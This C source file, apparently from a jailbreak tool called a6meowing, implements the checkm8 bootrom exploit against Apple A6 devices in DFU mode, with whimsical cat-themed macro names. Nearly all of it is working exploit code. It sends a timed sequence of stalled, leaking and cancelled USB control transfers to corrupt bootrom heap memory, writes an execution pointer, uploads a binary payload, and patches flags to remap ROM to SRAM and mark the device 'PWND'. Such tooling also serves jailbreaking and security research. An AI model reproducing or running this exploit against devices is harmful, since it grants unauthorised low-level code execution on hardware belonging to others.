/*
 * a6meowing - checkm8.c
 *
 * Copyright (c) 2022 - 2023 kok3shidoll
 *
 */

#include <io/iousb.h>
#include <common/common.h>
#include <common/log.h>

#include "shellcode/payload.h"

static unsigned char blank[DFU_MAX_TRANSFER_SZ];

// checkm8 usb req
__unused static transfer_t usb_req_stall(io_client_t client)
{
    return MEOW_CONTROL_TRANSFRE_TIME(client, 2, 3, 0x0000, 128, NULL, 0, 10);
}

__unused static transfer_t usb_req_leak(io_client_t client, unsigned char* blank)
{
    return MEOW_CONTROL_TRANSFRE_TIME(client, 0x80, 6, 0x0304, 0x040a, blank, EP0_MAX_PACKET_SZ, 1);
}

__unused static transfer_t usb_req_no_leak(io_client_t client, unsigned char* blank)
{
    return MEOW_CONTROL_TRANSFRE_TIME(client, 0x80, 6, 0x0304, 0x040a, blank, EP0_MAX_PACKET_SZ + 1, 1);
}

__unused static transfer_t leak(io_client_t client, unsigned char* blank)
{
    return MEOW_CONTROL_TRANSFRE_TIME(client, 0x80, 6, 0x0304, 0x040a, blank, 3 * EP0_MAX_PACKET_SZ, 1);
}

__unused static transfer_t no_leak(io_client_t client, unsigned char* blank)
{
    return MEOW_CONTROL_TRANSFRE_TIME(client, 0x80, 6, 0x0304, 0x040a, blank, (3 * EP0_MAX_PACKET_SZ) + 1, 1);
}

static void preRetry(io_client_t client, unsigned int i)
{
    transfer_t result;
    MEOWSET(&blank, '\x0', EP0_MAX_PACKET_SZ);
    
    DEVMEOW("MEOW %d", i);
    usleep(10000);
    result = MEOW_SEND_CAT(client, blank, EP0_MAX_PACKET_SZ); // send blank data and redo the request.
    usleep(10000);
}

static int isStalled(IOReturn res)
{
    if(res == kIOUSBPipeStalled || res == kUSBHostReturnPipeStalled)
        return 1;
    return 0;
}

static int isTimeout(IOReturn res)
{
    if(res == kIOReturnTimeout || res == kIOUSBTransactionTimeout)
        return 1;
    return 0;
}

static int checkm8_a6meow(io_client_t client)
{
    transfer_t result;
    int i = 0;
    
    MEOWWWW("Setting up the checkm8 meow");
    MEOWSET(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    
    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0x21, 1, 0x0000, 0x0000, blank, DFU_MAX_TRANSFER_SZ, 100);
    if(result.ret != kIOReturnSuccess)
    {
        ERROR("Failed to send meow");
        return -1;
    }
    
    MEOWSET(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    unsigned int push = 0x7C0; // max: 0x800 - 0x40
    unsigned int size = 0;
    UInt32 sent = 0;
    
    while(1)
    {
        sent = MEOW_ASYNC_CONTROL_TRANSFRE_CANCEL(client, 0x21, 1, 0x0000, 0x0000, blank, push + 0x40, 1000000);
        
        if(sent >= push)
            goto retry;
        
        size = push;
        size -= sent;
        
        DEVMEOW("Sent 0x%08x", (unsigned int)sent);
        
        result = MEOW_CONTROL_TRANSFRE_TIME(client, 0, 0, 0x0000, 0x0000, blank, size, 100);
        
        if(isStalled(result.ret))
            break;
        
    retry:
        i++;
        preRetry(client, i);
    }
    
    MEOWSET(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0x21, 1, 0x0000, 0x0000, NULL, 0, 100);
    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0xa1, 3, 0x0000, 0x0000, blank, 6, 100);
    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0xa1, 3, 0x0000, 0x0000, blank, 6, 100);
    
    while(1)
    {
        sent = MEOW_ASYNC_CONTROL_TRANSFRE_CANCEL(client, 0x80, 6, 0x0304, 0x040a, blank, 128, 100);
        DEVMEOW("Sent 0x%08x", (unsigned int)sent);
        
        result = MEOW_CONTROL_TRANSFRE_TIME(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
        if(sent != 128 && isTimeout(result.ret))
            break;
    }
    
    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0x02, 3, 0x0000, 128, NULL, 0, 10);
    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0x02, 3, 0x0000, 128, NULL, 0, 10);
    
    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0x80, 8, 0x0000, 0x0000, blank, 129, 100);
    
    usleep(500000);
    
    MEOWWWW("Reconnecting meow");
    MEOW_RECONNECT(&client, 10, DEVICE_DFU, USB_RESET|USB_REENUMERATE, false, 10000);
    if(!client) {
        ERROR("Failed to reconnect to meow");
        client = NULL;
        return -1;
    }
    MEOWWWW("Found DFU meow device");
    
    usleep(100000);
    
    MEOWSET(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    uint32_t* p = (uint32_t*)blank;
    p[0] = 0x00000000;
    p[1] = 0x00000000;
    p[2] = 0x00000000;
    p[3] = 0x00000000;
    p[4] = 0x00000000;
    p[5] = 0x10000000; // <- exec :3
    p[6] = 0x00000000;
    
    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0x02, 3, 0x0000, 128, NULL, 0, 10);
    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0x02, 3, 0x0000, 128, NULL, 0, 10);
    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0, 0, 0x0000, 0x0000, (unsigned char *)p, 4 * 7, 100);
    
    {
        size_t len = 0;
        size_t size;
        while(len < payload_bin_len) {
            size = ((payload_bin_len - len) > DFU_MAX_TRANSFER_SZ) ? DFU_MAX_TRANSFER_SZ : (payload_bin_len - len);
            result = MEOW_SEND_CAT_TIME(client, (unsigned char*)&payload_bin[len], size, 100);
            len += size;
        }
    }
    
    MEOWSET(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0x21, 1, 0x0000, 0x0000, NULL, 0, 100);
    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0xa1, 3, 0x0000, 0x0000, blank, 6, 100);
    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0xa1, 3, 0x0000, 0x0000, blank, 6, 100);
    
    usleep(1000000);
    
    MEOWWWW("Reconnecting meow");
    MEOW_RECONNECT(&client, 10, DEVICE_DFU, USB_RESET|USB_REENUMERATE, false, 10000);
    if(!client) {
        ERROR("Failed to reconnect to meow");
        client = NULL;
        return -1;
    }
    MEOWWWW("Found DFU meow device");
    
    return 0;
}

#define remap_rom_to_sram   (1 << 0)
#define enable_demotion     (1 << 1)
#define use_checkm8_payload (1 << 2)

int a6meowing(io_client_t client)
{
    uint16_t flag = remap_rom_to_sram;
    uint16_t* gOffsets = (uint16_t*)(payload_bin + 0x300);
    gOffsets[0] = flag;
    
    uint8_t* flagptr = MEOWMEOW(payload_bin, payload_bin_len, " FLAG:0000 PWND:[meowing]", sizeof(" FLAG:0000 PWND:[meowing]"));
    flagptr += 6;
    char str[8];
    MEOWSET(&str, 0x0, 8);
    SPRINTMEOW(str, "%04x", flag);
    MEOWCPY(flagptr, str, 4);
    
    return checkm8_a6meow(client);
}
